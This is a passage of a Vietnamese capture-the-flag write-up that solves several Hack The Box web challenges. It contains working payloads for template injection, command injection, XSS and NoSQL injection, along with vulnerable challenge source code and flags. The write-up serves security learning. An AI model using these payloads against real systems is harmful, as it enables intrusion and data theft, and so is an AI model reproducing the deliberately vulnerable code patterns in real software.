${self.context._with_template.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.context._with_template.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.context._with_template.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.runtime.exceptions.traceback.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
</code></pre><p>Ngo√†i ra c≈©ng c√≥ th·ªÉ d√πng <code>.open()</code> thay cho <code>read()</code>.</p>
<p><img src="https://hackmd.io/_uploads/ryYD02RJR.png" alt="image"></p>
<p>Flag : <code>HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}</code></p>
<h2 id="flag-command">Flag Command</h2>
<ul>
<li>
<p>ƒê√¢y l√† m·ªôt b√†i view client source trong gi·∫£i htb apocalypse n√™n c≈©ng kh√° l√† ƒë∆°n gi·∫£n</p>
</li>
<li>
<p>Giao di√™n d∆∞·ªõi ƒë√¢y:
<img src="https://hackmd.io/_uploads/ryE0eODSC.png" alt="image"></p>
</li>
<li>
<p>Nh∆∞ ta c√≥ th·ªÉ th·∫•y c√≥ m·ªôt ch·ª©c nƒÉng ƒë·ªÉ g√µ command-&gt; g·ªçi js t·ª´ main.js</p>
</li>
</ul>
<pre><code>&lt;script type=&quot;module&quot;&gt;
    import { startCommander, enterKey, userTextInput } from &quot;/static/terminal/js/main.js&quot;;
    startCommander();

    window.addEventListener(&quot;keyup&quot;, enterKey);

    // event listener for clicking on the terminal
    document.addEventListener(&quot;click&quot;, function () {
      userTextInput.focus();
    });


  &lt;/script&gt;
</code></pre><p><img src="https://hackmd.io/_uploads/rkWRWOwr0.png" alt="image"></p>
<ul>
<li>
<p>·ªû ƒë√¢y ch√∫ √Ω c√≥ m·ªôt h√†m g·ªçi /api/options v√† ta quan s√°t 
<img src="https://hackmd.io/_uploads/HkGeG_vHC.png" alt="image"></p>
</li>
<li>
<p>C√≥ <code>secret</code> ·ªü ƒë√¢y ch·∫Øc n√≥ ph·∫£i c√≥ m·ªôt t√°c d·ª•ng g√¨ ƒë√≥.</p>
</li>
<li>
<p>Ti·∫øp t·ª•c l·∫°i th·∫•y m·ªôt h√†m fetch api/monitor</p>
</li>
</ul>
<pre><code>async function CheckMessage() {
    fetchingResponse = true;
    currentCommand = commandHistory[commandHistory.length - 1];

    if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
        await fetch('/api/monitor', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 'command': currentCommand })
        })
            .then((res) =&gt; res.json())
            .then(async (data) =&gt; {
                console.log(data)
                await displayLineInTerminal({ text: data.message });

                if(data.message.includes('Game over')) {
                    playerLost();
                    fetchingResponse = false;
                    return;
                }

                if(data.message.includes('HTB{')) {
                    playerWon();
                    fetchingResponse = false;

                    return;
                }

                if (currentCommand == 'HEAD NORTH') {
                    currentStep = '2';
                }
                else if (currentCommand == 'FOLLOW A MYSTERIOUS PATH') {
                    currentStep = '3'
                }
                else if (currentCommand == 'SET UP CAMP') {
                    currentStep = '4'
                }

                let lineBreak = document.createElement(&quot;br&quot;);


                beforeDiv.parentNode.insertBefore(lineBreak, beforeDiv);
                displayLineInTerminal({ text: '&lt;span class=&quot;command&quot;&gt;You have 4 options!&lt;/span&gt;' })
                displayLinesInTerminal({ lines: availableOptions[currentStep] })
                fetchingResponse = false;
            });


    }
    else {
        displayLineInTerminal({ text: &quot;You do realise its not a park where you can just play around and move around pick from options how are hard it is for you????&quot; });
        fetchingResponse = false;
    }
}
</code></pre><ul>
<li>N√≥ nh·∫≠n m·ªôt json &ldquo;command&rdquo; v√† th·ª±c hi·ªán post ƒë·∫øn api/monitor v√† quan s√°t n·∫øu c√≥ <code>HTB{</code> th√¨ win v·∫≠y th√¨ ta th·ª≠ truy·ªÅn secret v√†o command th·ª≠ xem:</li>
<li><img src="https://hackmd.io/_uploads/BJx_XOwBC.png" alt="image"></li>
</ul>
<p>Flag: <code>HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}</code></p>
<h2 id="korp-terminal">KORP Terminal</h2>
<p><img src="https://hackmd.io/_uploads/SJYVudDS0.png" alt="image"></p>
<pre><code>GET /?format=%Y-%m-%d';+cat+/flag' HTTP/1.1
Host: 94.237.54.176:46820
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=1


</code></pre><p>Flag: <code>HTB{1t_i5_t1m3_f0r_ult1m4t3_pwn4g3!}</code></p>
<h2 id="spooktastic">SpookTastic</h2>
<ul>
<li>Ph·∫ßn m√¥ t·∫£ cho ch√∫ng ta bi·∫øt r·∫±ng ch√∫ng ta c·∫ßn b·∫≠t m·ªôt c·∫£nh b√°o ƒë·ªÉ x√°c nh·∫≠n b√≠ m·∫≠t ·∫©n gi·∫•u.
<img src="https://hackmd.io/_uploads/B1WTw7yIC.png" alt="image"></li>
<li>Ta quan s√°t ·ªü ph·∫ßn client ch·ªâ th·∫•y m·ªôt ƒëo·∫°n js ƒë∆°n gi·∫£n:</li>
</ul>
<pre><code>
btn.addEventListener(&quot;click&quot;, e =&gt; {
		e.preventDefault();
		fetch(&quot;/api/register&quot;, {
			method: &quot;POST&quot;,
			body: JSON.stringify({
				email: document.getElementById(&quot;email&quot;).value
			}),
			headers: {
				&quot;Content-Type&quot;: &quot;application/json&quot;
			}
		})
			.then(r =&gt; r.json())
			.then(r =&gt; {
				if (r.success) {
					alert(&quot;Thank you for signing up to our newsletter&quot;);
				}
			});
	});

	(() =&gt; {
		const socket = io();
		socket.on(&quot;flag&quot;, data =&gt; {
			console.log(data.flag);
			alert(data.flag);
		});
	})();
&lt;/script&gt;
</code></pre><ul>
<li>N·∫øu m√† ta click v√†o book now s·∫Ω g·ªçi ƒë·∫øn h√†m js tr√™n th·ª±c hi·ªán fetch api/register v·ªõi gi√° tr·ªã c·ªßa email.</li>
<li>Sau ƒë√≥ g·ªçi m·ªôt IIFE funcion ƒë·ªÉ k·∫øt n·ªëi socket v√† l·∫Øng nghe flag ƒë·ªÉ hi·ªÉn th·ªã flag.</li>
<li>V√¨ v·∫≠y n√™n ch√∫ng ta ƒëi v√†o xem source code c·ªßa chall:</li>
</ul>
<pre><code>import random, string
from flask import Flask, request, render_template, abort
from flask_socketio import SocketIO
from threading import Thread

app = Flask(__name__)

socketio = SocketIO(app)

registered_emails, socket_clients = [], {}

generate = lambda x: &quot;&quot;.join([random.choice(string.hexdigits) for _ in range(x)])
BOT_TOKEN = generate(16)

def blacklist_pass(email):
    email = email.lower()

    if &quot;script&quot; in email:
        return False

    return True


def send_flag(user_ip):
    for id, ip in socket_clients.items():
        if ip == user_ip:
            socketio.emit(&quot;flag&quot;, {&quot;flag&quot;: open(&quot;flag.txt&quot;).read()}, room=id)


def start_bot(user_ip):
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

    host, port = &quot;localhost&quot;, 1337
    HOST = f&quot;http://{host}:{port}&quot;

    options = Options()

    options.add_argument(&quot;--headless&quot;)
    options.add_argument(&quot;--no-sandbox&quot;)
    options.add_argument(&quot;--disable-dev-shm-usage&quot;)
    options.add_argument(&quot;--disable-infobars&quot;)
    options.add_argument(&quot;--disable-background-networking&quot;)
    options.add_argument(&quot;--disable-default-apps&quot;)
    options.add_argument(&quot;--disable-extensions&quot;)
    options.add_argument(&quot;--disable-gpu&quot;)
    options.add_argument(&quot;--disable-sync&quot;)
    options.add_argument(&quot;--disable-translate&quot;)
    options.add_argument(&quot;--hide-scrollbars&quot;)
    options.add_argument(&quot;--metrics-recording-only&quot;)
    options.add_argument(&quot;--mute-audio&quot;)
    options.add_argument(&quot;--no-first-run&quot;)
    options.add_argument(&quot;--dns-prefetch-disable&quot;)
    options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;)
    options.add_argument(&quot;--media-cache-size=1&quot;)
    options.add_argument(&quot;--disk-cache-size=1&quot;)
    options.add_argument(&quot;--user-agent=HTB/1.0&quot;)

    service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;)
    browser = webdriver.Chrome(service=service, options=options)

    try:
        browser.get(f&quot;{HOST}/bot?token={BOT_TOKEN}&quot;)

        WebDriverWait(browser, 3).until(EC.alert_is_present())

        alert = browser.switch_to.alert
        alert.accept()
        send_flag(user_ip)
    except Exception as e:
        pass
    finally:
        registered_emails.clear()
        browser.quit()


@app.route(&quot;/&quot;)
def index():
    return render_template(&quot;index.html&quot;)


@app.route(&quot;/api/register&quot;, methods=[&quot;POST&quot;])
def register():
    if not request.is_json or not request.json[&quot;email&quot;]:
        return abort(400)
    
    if not blacklist_pass(request.json[&quot;email&quot;]):
        return abort(401)

    registered_emails.append(request.json[&quot;email&quot;])
    Thread(target=start_bot, args=(request.remote_addr,)).start()
    return {&quot;success&quot;:True}


@app.route(&quot;/bot&quot;)
def bot():
    if request.args.get(&quot;token&quot;, &quot;&quot;) != BOT_TOKEN:
        return abort(404)
    return render_template(&quot;bot.html&quot;, emails=registered_emails)


@socketio.on(&quot;connect&quot;)
def on_connect():
    socket_clients[request.sid] = request.remote_addr


@socketio.on(&quot;disconnect&quot;)
def on_disconnect():
    del socket_clients[request.sid]


if __name__ == &quot;__main__&quot;:
    app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False)

</code></pre><ul>
<li>Quan s√°t ƒë·∫ßu ti√™n ta c√≥ /api/register method POST s·∫Ω nh·∫≠n email sau ƒë√≥ s·∫Ω filter blacklist :</li>
</ul>
<pre><code>def blacklist_pass(email):
    email = email.lower()

    if &quot;script&quot; in email:
        return False

    return True
</code></pre><ul>
<li>Sau ƒë√≥ <code>registered_emails.append</code> th√™m v√†o m·∫£ng n√†y gi√° tr·ªã c·ªßa email.</li>
<li>C√≥ th·ªÉ hi·ªÉu t·∫°i sao js g·ª≠i tr·ª±c ti·∫øp trong devtool nh∆∞ng kh√¥ng ƒë∆∞·ª£c v√¨:</li>
</ul>
<pre><code>def send_flag(user_ip):
    for id, ip in socket_clients.items():
        if ip == user_ip:
            socketio.emit(&quot;flag&quot;, {&quot;flag&quot;: open(&quot;flag.txt&quot;).read()}, room=id)
</code></pre><ul>
<li>Ph·∫£i ip n·∫±m trong user_ip m·ªõi c√≥ th·ªÉ nh·∫≠n ƒë∆∞·ª£c flag.</li>
<li>
<ul>
<li>N√≥ t·∫°o m·ªôt Thread ƒë·ªÉ start_bot v·ªõi arg l√† <code>request.remote_addr</code> v√† ƒë·∫ßy l√† h√†m start_bot:</li>
</ul>
</li>
</ul>
<pre><code>def start_bot(user_ip):
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

    host, port = &quot;localhost&quot;, 1337
    HOST = f&quot;http://{host}:{port}&quot;

    options = Options()

    options.add_argument(&quot;--headless&quot;)
    options.add_argument(&quot;--no-sandbox&quot;)
    options.add_argument(&quot;--disable-dev-shm-usage&quot;)
    options.add_argument(&quot;--disable-infobars&quot;)
    options.add_argument(&quot;--disable-background-networking&quot;)
    options.add_argument(&quot;--disable-default-apps&quot;)
    options.add_argument(&quot;--disable-extensions&quot;)
    options.add_argument(&quot;--disable-gpu&quot;)
    options.add_argument(&quot;--disable-sync&quot;)
    options.add_argument(&quot;--disable-translate&quot;)
    options.add_argument(&quot;--hide-scrollbars&quot;)
    options.add_argument(&quot;--metrics-recording-only&quot;)
    options.add_argument(&quot;--mute-audio&quot;)
    options.add_argument(&quot;--no-first-run&quot;)
    options.add_argument(&quot;--dns-prefetch-disable&quot;)
    options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;)
    options.add_argument(&quot;--media-cache-size=1&quot;)
    options.add_argument(&quot;--disk-cache-size=1&quot;)
    options.add_argument(&quot;--user-agent=HTB/1.0&quot;)

    service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;)
    browser = webdriver.Chrome(service=service, options=options)

    try:
        browser.get(f&quot;{HOST}/bot?token={BOT_TOKEN}&quot;)

        WebDriverWait(browser, 3).until(EC.alert_is_present())

        alert = browser.switch_to.alert
        alert.accept()
        send_flag(user_ip)
    except Exception as e:
        pass
    finally:
        registered_emails.clear()
        browser.quit()
</code></pre><ul>
<li>N√≥ s·ª≠ d·ª•ng th∆∞ vi·ªán selenium g·ªçi ƒë·∫øn localhost:1337/bot v√† ·ªü /bot s·∫Ω hi·ªÉn th·ªã trang bot.html</li>
</ul>
<pre><code>// bot.html
{% for email in emails %}
    &lt;span&gt;{{ email|safe }}&lt;/span&gt;&lt;br/&gt;
{% endfor %}
</code></pre><ul>
<li>c√≥ th·ªÉ th·∫•y trong n√†y s·∫Ω li·ªát k√™ t·∫•t c·∫£ nh·ªØng email v·ªõi mode l√† safe.</li>
<li>V√¨ v·∫≠y ƒë√¢y s·∫Ω b·ªã XSS. Nh∆∞ng m√† l√†m sao ƒë·ªÉ emit ƒë·∫øn flag th√¨ n√≥ g·ªçi ƒë·∫øn h√†m <code>send_flag(user_ip)</code> ·ªü d∆∞·ªõi ƒë√≥ lu√¥n.</li>
<li>Tr∆∞·ªõc ƒë√≥ n√≥ chuy·ªÉn snags ng·ªØ c·∫£nh alert ƒë·ªÉ hi·ªÉn th·ªã thanh c·∫£nh b√°o</li>
<li>D√πng XSS : <code>&lt;img src=1 onerror=prompt()</code>
<img src="https://hackmd.io/_uploads/HJp-pBJUC.png" alt="image"></li>
</ul>
<h2 id="juggling-facts">Juggling facts</h2>
<ul>
<li>M·ªôt chall php c√≥ c√°c route nh∆∞ sau:</li>
</ul>
<pre><code>
$router = new Router();
$router-&gt;new('GET', '/', 'IndexController@index');

$router-&gt;new('POST','/api/getfacts', 'IndexController@getfacts');
</code></pre><ul>
<li>Ta c√≥ th·ªÉ th·∫•y ch·ªâ c√≥ 2 route ch√≠nh:</li>
</ul>
<pre><code>/index
 public function index($router)
    {
        $router-&gt;view('index');
    }
</code></pre><ul>
<li>index ch·ªâ ƒë·ªÉ hi·ªán th·ªã trang index.</li>
</ul>
<pre><code>  public function getfacts($router)
    {
        $jsondata = json_decode(file_get_contents('php://input'), true);

        if ( empty($jsondata) || !array_key_exists('type', $jsondata))
        {
            return $router-&gt;jsonify(['message' =&gt; 'Insufficient parameters!']);
        }

        if ($jsondata['type'] === 'secrets' &amp;&amp; $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
        {
            return $router-&gt;jsonify(['message' =&gt; 'Currently this type can be only accessed through localhost!']);
        }

        switch ($jsondata['type'])
        {
            case 'secrets':
                return $router-&gt;jsonify([
                    'facts' =&gt; $this-&gt;facts-&gt;get_facts('secrets')
                ]);

            case 'spooky':
                return $router-&gt;jsonify([
                    'facts' =&gt; $this-&gt;facts-&gt;get_facts('spooky')
                ]);
            
            case 'not_spooky':
                return $router-&gt;jsonify([
                    'facts' =&gt; $this-&gt;facts-&gt;get_facts('not_spooky')
                ]);
            
            default:
                return $router-&gt;jsonify([
                    'message' =&gt; 'Invalid type!'
                ]);
        }
    }
</code></pre><ul>
<li>H√†m n√†y s·∫Ω l·∫•y php://input l√† m·ªôt wrapper c·ªßa php n√≥ nh·∫≠n global sau ƒë√≥ check n·∫øu type === secrets v√† n·∫øu ip kh√°c localhot th√¨ tr·∫£ tin nh·∫Øn kh√¥ng th·ªÉ access.</li>
<li>Check v·ªõi switch case:</li>
<li>N·∫øu type <code>'facts' =&gt; $this-&gt;facts-&gt;get_facts('secrets')</code> ch·∫Øn ch·∫Øn th√¨ ƒë√¢y l√† flag r·ªìi nh∆∞ng m√† ·ªü tr√™n ta th·∫•y n·∫øu type===secrets th√¨ s·∫Ω kh√¥ng cho access nh∆∞ng m√† d∆∞·ªõi n√†y l·∫°i check.</li>
<li>N·∫øu ta truy·ªÅn type=true th√¨ c√≥ th·ªÉ bypass ƒë∆∞·ª£c :</li>
</ul>
<p><img src="https://hackmd.io/_uploads/S10FOUy80.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H12iuIJLR.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJL6OIkLR.png" alt="image"></p>
<p>flag : <code>HTB{juggl1ng_1s_d4ng3r0u5!!!}</code></p>
<h2 id="candyvault">CandyVault</h2>
<ul>
<li>M·ªôt chall v·ªõi python + mogodb:</li>
<li>Nh√¨n s∆° qua th√¨ m√¨nh ƒë√£ ƒëo√°n ƒë∆∞·ª£c trang web b·ªã d√≠nh nosqli v·ªõi mogodb, tr∆∞·ªõc ti√™n th√¨ ƒë√¢y l√† source code ch√≠nh c·ªßa server:</li>
</ul>
<pre><code>from flask import Flask, Blueprint, render_template, redirect, jsonify, request
from flask_bcrypt import Bcrypt
from pymongo import MongoClient

app = Flask(__name__)
app.config.from_object(&quot;application.config.Config&quot;)
bcrypt = Bcrypt(app)

client = MongoClient(app.config[&quot;MONGO_URI&quot;])
db = client[app.config[&quot;DB_NAME&quot;]]
users_collection = db[&quot;users&quot;]

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, &quot;description&quot;) else [str(x) for x in error.args]
    
    response = {
        &quot;error&quot;: {
            &quot;type&quot;: error.__class__.__name__,
            &quot;message&quot;: message
        }
    }

    return response, error.code if hasattr(error, &quot;code&quot;) else 500


@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
def index():
    return render_template(&quot;index.html&quot;)


@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
def login():
    content_type = request.headers.get(&quot;Content-Type&quot;)

    if content_type == &quot;application/x-www-form-urlencoded&quot;:
        email = request.form.get(&quot;email&quot;)
        password = request.form.get(&quot;password&quot;)

    elif content_type == &quot;application/json&quot;:
        data = request.get_json()
        email = data.get(&quot;email&quot;)
        password = data.get(&quot;password&quot;)
    
    else:
        return jsonify({&quot;error&quot;: &quot;Unsupported Content-Type&quot;}), 400

    user = users_collection.find_one({&quot;email&quot;: email, &quot;password&quot;: password})

    if user:
        return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read())
    else:
        return redirect(&quot;/&quot;)

</code></pre><ul>
<li>c√≥ th·ªÉ th·∫•y /login v·ªõi method GET v√† POST ·ªü ƒë√¢y ta ch·ªâ ch√∫ t√¢m v·ªõi POST n√≥ s·∫Ω nh·∫≠n email v√† password c√≥ th·ªÉ nh·∫≠n theo ki·ªÉu <code>application/x-www-form-urlencoded</code> ho·∫∑c <code>application/json</code> sau ƒë√≥ s·∫Ω check v·ªõi mongo n·∫øu t·ªën t·∫°i user th·ªèa m√£n th√¨ s·∫Ω tr·∫£ ra flag cho ch√∫ng ta.</li>
<li>·ªü ƒë√¢y ta s·∫Ω l·ª£i d·ª•ng json ƒë·ªÉ truy·ªÅn v·ªõi payload nosqli:</li>
</ul>
<p><img src="https://hackmd.io/_uploads/Hkgai8kLA.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HyWg3I1U0.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SkE7hIkIC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/r11LhLJI0.png" alt="image"></p>
<pre><code>POST /login HTTP/1.1
Host: 94.237.63.201:41731
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 46
Origin: http://94.237.63.201:41731
Connection: close
Referer: http://94.237.63.201:41731/
Upgrade-Insecure-Requests: 1
Priority: u=1

{&quot;email&quot;:{&quot;$ne&quot;:null},&quot;password&quot;:{&quot;$ne&quot;:null}}
</code></pre><p>flag : <code>HTB{s4y_h1_t0_th3_c4andy_v4u1t!}</code></p>
<h2 id="jailbreak">Jailbreak</h2>
<ul>
<li>Chall ƒë∆°n gi·∫£n trong HTB-Business d√≠nh vul XXE:</li>
</ul>
<p><img src="https://hackmd.io/_uploads/B1FMTU1UC.png" alt="image"></p>
<ul>
<li>Quan s√°t qua ch·ªâ c√≥ ch·ª©c nƒÉng update-firmware l√† g·ª≠i api:</li>
</ul>
<p><img src="https://hackmd.io/_uploads/BJpETU1IA.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BJJ868kI0.png" alt="image"></p>
<ul>
<li>Ta l·∫≠p t·ª©c th·ª≠ xxe ƒë·ªÉ l·∫•y flag.txt ·ªü root:</li>
</ul>
<p><img src="https://hackmd.io/_uploads/ByI9TIJL0.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkKqT8kUA.png" alt="image"></p>
<p>flag : <code>HTB{bi0m3tric_l0cks_4nd_fl1ck3r1ng_l1ght5}</code></p>
<h2 id="cursed-secret-party">Cursed Secret Party</h2>
<ul>
<li>M·ªôt chall v·ªõi source code nodejs:</li>
</ul>
<pre><code>const express = require('express');
const app = express();
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const nunjucks = require('nunjucks');
const routes = require('./routes');
const Database = require('./database');

const db = new Database('party.db');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());
app.use(cookieParser());

app.use(function (req, res, next) {
    res.setHeader(
        &quot;Content-Security-Policy&quot;,
        &quot;script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'&quot;
    );
    next();
});


nunjucks.configure('views', {
    autoescape: true,
    express: app
});

app.set('views', './views');
app.use('/static', express.static('./static'));

app.use(routes(db));

app.all('*', (req, res) =&gt; {
    return res.status(404).send({
        message: '404 page not found'
    });
});

app.use(function (err, req, res, next) {
    res.status(500).json({ message: 'Something went wrong!' });
});

(async () =&gt; {
    await db.connect();
    await db.migrate();
    app.listen(1337, '0.0.0.0', () =&gt; console.log('Listening on port 1337'));
})();
</code></pre><ul>
<li>ƒê·ªÉ √Ω th√¨ trang web s·∫Ω set middleware l√† m·ªôt CSP :</li>
</ul>
<pre><code>app.use(function (req, res, next) {
    res.setHeader(
        &quot;Content-Security-Policy&quot;,
        &quot;script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'&quot;
    );
    next();
});
</code></pre><ul>
<li>Server c√≥ route ƒë∆∞·ª£c config trong file ./route.js</li>
</ul>
<pre><code>app.use(routes(db));
</code></pre><pre><code>const express = require('express');
const router = express.Router({ caseSensitive: true });
const AuthMiddleware = require('../middleware/AuthMiddleware');
const bot = require('../bot');

let db;

const response = data =&gt; ({ message: data });

router.get('/', (req, res) =&gt; {
    return res.render('index.html');
});

router.post('/api/submit', (req, res) =&gt; {
    const { halloween_name, email, costume_type, trick_or_treat } = req.body;

    if (halloween_name &amp;&amp; email &amp;&amp; costume_type &amp;&amp; trick_or_treat) {

        return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
            .then(() =&gt; {
                res.send(response('Your request will be reviewed by our team!'));

                bot.visit();
            })
            .catch(() =&gt; res.send(response('Something Went Wrong!')));
    }

    return res.status(401).send(response('Please fill out all the required fields!'));
});

router.get('/admin', AuthMiddleware, (req, res) =&gt; {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }

    return db.get_party_requests()
        .then((data) =&gt; {
            res.render('admin.html', { requests: data });
        });
});

router.get('/admin/delete_all', AuthMiddleware, (req, res) =&gt; {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }
    
    return db.remove_requests()
            .then(() =&gt; res.send(response('All records are deleted!')));
})

module.exports = database =&gt; {
    db = database;
    return router;
};
</code></pre><ul>
<li>Nh∆∞ b·∫°n c√≥ th·ªÉ th·∫•y ·ªü ƒë√¢y c√≥ 3 route ch√≠nh nh∆∞ng tr∆∞·ªõc h·∫øt th√¨ ta s·∫Ω ki·∫øm v·ªã tr√≠ c·ªßa flag tr∆∞·ªõc:</li>
</ul>
<pre><code>/bot.js
const fs = require('fs');
const puppeteer = require('puppeteer');
const JWTHelper = require('./helpers/JWTHelper');
const flag = fs.readFileSync('/flag.txt', 'utf8');

const browser_options = {
	headless: true,
	args: [
		'--no-sandbox',
		'--disable-background-networking',
		'--disable-default-apps',
		'--disable-extensions',
		'--disable-gpu',
		'--disable-sync',
		'--disable-translate',
		'--hide-scrollbars',
		'--metrics-recording-only',
		'--mute-audio',
		'--no-first-run',
		'--safebrowsing-disable-auto-update',
		'--js-flags=--noexpose_wasm,--jitless'
	]
};

const visit = async () =&gt; {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

		let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});

		await page.goto('http://127.0.0.1:1337/admin', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		setTimeout(() =&gt; {
			browser.close();
		}, 5000);

    } catch(e) {
        console.log(e);
    }
};

module.exports = { visit };
</code></pre><ul>
<li>S·ª≠ d·ª•ng chronium <code>puppeteer</code> sau ƒë√≥ truy c·∫≠p /admin v·ªõi token ch·ª©a flag.</li>
<li>sau ƒë√≥ n√≥ truy c·∫≠p :</li>
</ul>
<pre><code>await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});
</code></pre><ul>
<li>·ªü endpoint /admin :</li>
</ul>
<pre><code>router.get('/admin', AuthMiddleware, (req, res) =&gt; {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }

    return db.get_party_requests()
        .then((data) =&gt; {
            res.render('admin.html', { requests: data });
        });
});
</code></pre><ul>
<li>s·∫Ω check middleware n·∫øu l√† admin m·ªõi cho truy c·∫≠p sau ƒë√≥ th·ª±c hi·ªán query sql:</li>
</ul>
<pre><code>	async get_party_requests(){
		return new Promise(async (resolve, reject) =&gt; {
			try {
				let stmt = await this.db.prepare('SELECT * FROM party_requests');
				resolve(await stmt.all());
			} catch(e) {
				reject(e);
			}
		});
	}
</code></pre><ul>
<li>
<p>Tr·∫£ ra t·∫•t c·∫£ b·∫£n ghi t·ª´ <code>party_requests</code> sau ƒë√≥ hi·ªÉn th·ªã ra trang admin.</p>
</li>
<li>
<p>C√≤n <code>/admin/delete_all</code>:</p>
</li>
</ul>
<pre><code>router.get('/admin/delete_all', AuthMiddleware, (req, res) =&gt; {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }
    
    return db.remove_requests()
            .then(() =&gt; res.send(response('All records are deleted!')));
})
</code></pre><ul>
<li>c≈©ng c·∫ßn role admin sau ƒë√≥ g·ªçi :</li>
</ul>
<pre><code>	async remove_requests(){
		return new Promise(async (resolve, reject) =&gt; {
			try {
				let stmt = await this.db.prepare('DELETE FROM party_requests');
				resolve(await stmt.run());
			} catch(e) {

			}
		})
	}

</code></pre><ul>
<li>Th·ª±c hi·ªán x√≥a t·∫•t c·∫£ b·∫£n ghi ·ªü b·∫£ng tr√™n.</li>
<li>V·∫≠y th√¨ ch·ªâ c√≥ th·ªÉ th·∫•y b√†i n√†y c√≥ h∆∞·ªõng XSS v·ªõi page admin.html:</li>
</ul>
<pre><code>&lt;html&gt;
    &lt;head&gt;
        &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot; /&gt;
        &lt;title&gt;Admin panel&lt;/title&gt;
    &lt;/head&gt;

    &lt;body&gt;
        &lt;div class=&quot;container&quot; style=&quot;margin-top: 20px&quot;&gt;
            {% for request in requests %} 
                &lt;div class=&quot;card&quot;&gt;
                &lt;div class=&quot;card-header&quot;&gt; &lt;strong&gt;Halloween Name&lt;/strong&gt; : {{ request.halloween_name | safe }} &lt;/div&gt;
                &lt;div class=&quot;card-body&quot;&gt;
                    &lt;p class=&quot;card-title&quot;&gt;&lt;strong&gt;Email Address&lt;/strong&gt;    : {{ request.email }}&lt;/p&gt;
                    &lt;p class=&quot;card-text&quot;&gt;&lt;strong&gt;Costume Type &lt;/strong&gt;   : {{ request.costume_type }} &lt;/p&gt;
                    &lt;p class=&quot;card-text&quot;&gt;&lt;strong&gt;Prefers tricks or treat &lt;/strong&gt;   : {{ request.trick_or_treat }} &lt;/p&gt;
                    
                    &lt;button class=&quot;btn btn-primary&quot;&gt;Accept&lt;/button&gt;
                    &lt;button class=&quot;btn btn-danger&quot;&gt;Delete&lt;/button&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            {% endfor %}
        &lt;/div&gt;

    &lt;/body&gt;
&lt;/html&gt;
</code></pre><ul>
